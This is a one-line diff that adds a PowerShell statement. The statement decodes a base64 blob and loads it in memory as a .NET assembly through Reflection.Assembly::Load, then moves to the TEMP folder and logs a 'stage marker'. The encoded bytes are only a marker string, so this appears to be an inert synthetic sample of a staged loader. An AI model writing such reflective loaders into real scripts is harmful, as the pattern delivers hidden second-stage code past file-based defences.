@@ -1,0 +1,1 @@
+$StageBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjppZjR5NGc2Y2Zm"); Write-Verbose ("Assembly bytes: " + $StageBytes.Length); [Reflection.Assembly]::Load($StageBytes); Set-Location -Path $env:TEMP; Write-Verbose "stage marker 18 reached"
